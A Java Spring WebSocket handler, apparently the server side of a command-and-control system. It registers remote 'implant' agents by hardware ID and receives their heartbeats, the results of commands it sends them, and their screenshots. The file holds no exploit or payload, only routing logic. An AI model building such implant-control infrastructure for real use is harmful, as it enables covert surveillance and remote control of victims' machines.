package com.sentinel.websocket.handler;

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.sentinel.dto.request.CommandResultDTO;
import com.sentinel.dto.request.HeartbeatDTO;
import com.sentinel.dto.request.ScreenshotUploadDTO;
import com.sentinel.dto.request.WebSocketMessage;
import com.sentinel.service.AgentService;
import com.sentinel.service.CommandService;
import com.sentinel.service.ScreenshotService;
import com.sentinel.websocket.session.WebSocketSessionManager;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.lang.NonNull;
import org.springframework.stereotype.Component;
import org.springframework.web.socket.CloseStatus;
import org.springframework.web.socket.TextMessage;
import org.springframework.web.socket.WebSocketSession;
import org.springframework.web.socket.handler.TextWebSocketHandler;

/**
 * WebSocket handler for Agent (Implant) connections.
 * 
 * Handles incoming messages:
 * - HEARTBEAT: Telemetry data from agent
 * - COMMAND_RESULT: Result of executed command
 * - SCREENSHOT_UPLOAD: Base64 encoded screenshot
 * 
 * Protocol:
 * 1. Agent connects to /ws-sentinel with X-Agent-Auth header
 * 2. After connection, agent sends REGISTER message with HWID
 * 3. Agent sends periodic HEARTBEAT messages
 * 4. Server sends COMMAND messages to agent
 * 5. Agent responds with COMMAND_RESULT
 */
@Component
@RequiredArgsConstructor
@Slf4j
public class AgentWebSocketHandler extends TextWebSocketHandler {

    private final ObjectMapper objectMapper;
    private final WebSocketSessionManager sessionManager;
    private final AgentService agentService;
    private final CommandService commandService;
    private final ScreenshotService screenshotService;

    private static final String ATTR_HWID = "agent_hwid";

    @Override
    public void afterConnectionEstablished(@NonNull WebSocketSession session) {
        log.info("Agent WebSocket connection established: {}", session.getId());
    }

    @Override
    protected void handleTextMessage(@NonNull WebSocketSession session, @NonNull TextMessage message) {
        try {
            String payload = message.getPayload();
            log.debug("Received from agent: {}", payload);

            WebSocketMessage wsMessage = objectMapper.readValue(payload, WebSocketMessage.class);
            String messageType = wsMessage.getType();

            if (messageType == null) {
                log.warn("Received message without type from session {}", session.getId());
                return;
            }

            switch (messageType.toUpperCase()) {
                case "HEARTBEAT" -> handleHeartbeat(session, wsMessage.getPayload());
                case "COMMAND_RESULT" -> handleCommandResult(session, wsMessage.getPayload());
                case "SCREENSHOT_UPLOAD" -> handleScreenshotUpload(session, wsMessage.getPayload());
                case "REGISTER" -> handleRegister(session, wsMessage.getPayload());
                default -> log.warn("Unknown message type from agent: {}", messageType);
            }

        } catch (JsonProcessingException e) {
            log.error("Failed to parse agent message: {}", e.getMessage());
        } catch (Exception e) {
            log.error("Error handling agent message: {}", e.getMessage(), e);
        }
    }

    @Override
    public void afterConnectionClosed(@NonNull WebSocketSession session, @NonNull CloseStatus status) {
        String hwid = getHwid(session);
        if (hwid != null) {
            sessionManager.unregisterAgent(hwid);
            log.info("Agent disconnected: {} (status: {})", hwid, status);
        } else {
            log.info("Unregistered agent session closed: {} (status: {})", session.getId(), status);
        }
    }

    @Override
    public void handleTransportError(@NonNull WebSocketSession session, @NonNull Throwable exception) {
        String hwid = getHwid(session);
        log.error("Transport error for agent {}: {}", hwid != null ? hwid : session.getId(), exception.getMessage());
    }

    // ==================== MESSAGE HANDLERS ====================

    /**
     * Handle agent registration (first message after connect).
     */
    private void handleRegister(WebSocketSession session, JsonNode payload) {
        try {
            String hwid = payload.get("hwid").asText();
            if (hwid != null && !hwid.isEmpty()) {
                session.getAttributes().put(ATTR_HWID, hwid);
                sessionManager.registerAgent(hwid, session);
                log.info("Agent registered via REGISTER: {}", hwid);
            }
        } catch (Exception e) {
            log.error("Failed to handle REGISTER: {}", e.getMessage());
        }
    }

    /**
     * Handle heartbeat/telemetry from agent.
     * This also serves as implicit registration if not already registered.
     */
    private void handleHeartbeat(WebSocketSession session, JsonNode payload) {
        try {
            HeartbeatDTO heartbeat = objectMapper.treeToValue(payload, HeartbeatDTO.class);
            
            String existingHwid = getHwid(session);
            if (existingHwid == null) {
                session.getAttributes().put(ATTR_HWID, heartbeat.getHwid());
                sessionManager.registerAgent(heartbeat.getHwid(), session);
                log.info("Agent registered via HEARTBEAT: {}", heartbeat.getHwid());
            }

            agentService.processHeartbeat(heartbeat);
            
        } catch (Exception e) {
            log.error("Failed to handle HEARTBEAT: {}", e.getMessage());
        }
    }

    /**
     * Handle command execution result from agent.
     */
    private void handleCommandResult(WebSocketSession session, JsonNode payload) {
        try {
            CommandResultDTO result = objectMapper.treeToValue(payload, CommandResultDTO.class);
            
            if (result.getHwid() == null || result.getHwid().isEmpty()) {
                result.setHwid(getHwid(session));
            }

            commandService.processCommandResult(result);
            log.info("Command result received: {} - {}", result.getCommandId(), result.getStatus());
            
        } catch (Exception e) {
            log.error("Failed to handle COMMAND_RESULT: {}", e.getMessage());
        }
    }

    /**
     * Handle screenshot upload from agent.
     */
    private void handleScreenshotUpload(WebSocketSession session, JsonNode payload) {
        try {
            ScreenshotUploadDTO upload = objectMapper.treeToValue(payload, ScreenshotUploadDTO.class);
            
            // Set HWID from session if not in payload
            if (upload.getHwid() == null || upload.getHwid().isEmpty()) {
                upload.setHwid(getHwid(session));
            }

            screenshotService.processUpload(upload);
            log.info("Screenshot received from agent: {}", upload.getHwid());
            
        } catch (Exception e) {
            log.error("Failed to handle SCREENSHOT_UPLOAD: {}", e.getMessage());
        }
    }

    // ==================== UTILITY METHODS ====================

    private String getHwid(WebSocketSession session) {
        Object hwid = session.getAttributes().get(ATTR_HWID);
        return hwid != null ? hwid.toString() : null;
    }
}
